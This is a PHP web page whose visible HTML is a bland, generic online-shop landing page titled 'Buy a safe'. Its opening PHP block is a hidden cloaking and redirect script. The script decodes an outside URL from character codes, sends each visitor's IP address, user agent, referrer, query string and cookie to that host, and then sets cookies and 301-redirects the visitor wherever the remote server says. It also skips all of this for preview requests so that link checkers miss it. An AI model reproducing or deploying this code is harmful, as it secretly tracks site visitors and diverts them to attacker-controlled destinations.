<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "526705";$uid="lqmfmmmychckyqir2u1b0vzqr";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<html lang=ru><meta charset=utf-8>
<meta name=viewport content="width=device-width, initial-scale=1.0">
<title>Buy a safe  | ShopEase.page</title>
<style>body{font-family:Arial,sans-serif;margin:0;padding:0;background:#f9f9f9;color:#333}header{background:#000;padding:20px;text-align:center}header h1{color:#4586cb;font-size:2.2em;margin:0}header p{color:#fff;margin-top:5px}footer{background:#000;color:#fff;padding:20px;text-align:center}.container{max-width:1100px;margin:0 auto;padding:20px;background:#fff}h1,h2{color:#111}ul{padding-left:20px}.section{margin-top:40px}.contact p{margin:5px 0}.footer-info{font-size:0.9em;color:#ccc}</style>
<meta name=referrer content=no-referrer><link rel=canonical href="#"><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"></head>
<body>
<header>
 <h1>ShopEase</h1>
 <p>Your one-stop destination for quality products at the best prices!</p>
</header>

<div class=container>

<section class=intro>
 <h2>Discover a wide range of products</h2>
 <p>We offer a diverse collection of products including electronics, fashion, home essentials, accessories, and much more. All items are carefully selected to ensure quality and value for money.</p>
 <p>Shopping with us is quick, easy, and secure. Our team is always ready to help you find exactly what you need.</p>
</section>

<section class="catalog section">
 <h2>What you will find in our store</h2>
 <ul>
  <li>Latest electronics and gadgets</li>
  <li>Men's and women's fashion</li>
  <li>Home and kitchen essentials</li>
  <li>Beauty and personal care products</li>
  <li>Accessories and lifestyle items</li>
  <li>Exclusive deals and seasonal offers</li>
 </ul>
</section>

<section class="delivery section">
 <h2>Fast and reliable delivery</h2>
 <p>We provide quick delivery across multiple locations with safe and secure packaging. Our logistics partners ensure your order reaches you on time.</p>
 <p>You can track your orders easily and get updates at every step of the delivery process.</p>
</section>

<section class="whyus section">
 <h2>Why shop with us</h2>
 <ul>
  <li>High-quality products</li>
  <li>Affordable and competitive pricing</li>
  <li>Secure payment options</li>
  <li>Easy returns and refunds</li>
  <li>24/7 customer support</li>
  <li>Fast and reliable delivery</li>
 </ul>
</section>

<section class="company section">
 <h2>About us</h2>
 <p>ShopEase is a growing e-commerce platform dedicated to bringing customers the best products from trusted brands. Since our launch, we have focused on delivering value, convenience, and a seamless shopping experience.</p>
 <p>Our mission is to make online shopping simple, affordable, and enjoyable for everyone.</p>
</section>

<section class="contact section">
 <h2>Contact us</h2>
 <p>📞 +1 (800) 123-4567</p>
 <p>📧 <a href="mailto:support@shopease.com">support@shopease.com</a></p>
 <p><strong>Need help?</strong> Reach out to us anytime and our support team will assist you!</p>
</section>

</div>

<footer>
 <p>© 2026 ShopEase. All rights reserved.</p>
 <p class=footer-info>Developed by StarMedia</p>
</footer>
</body>
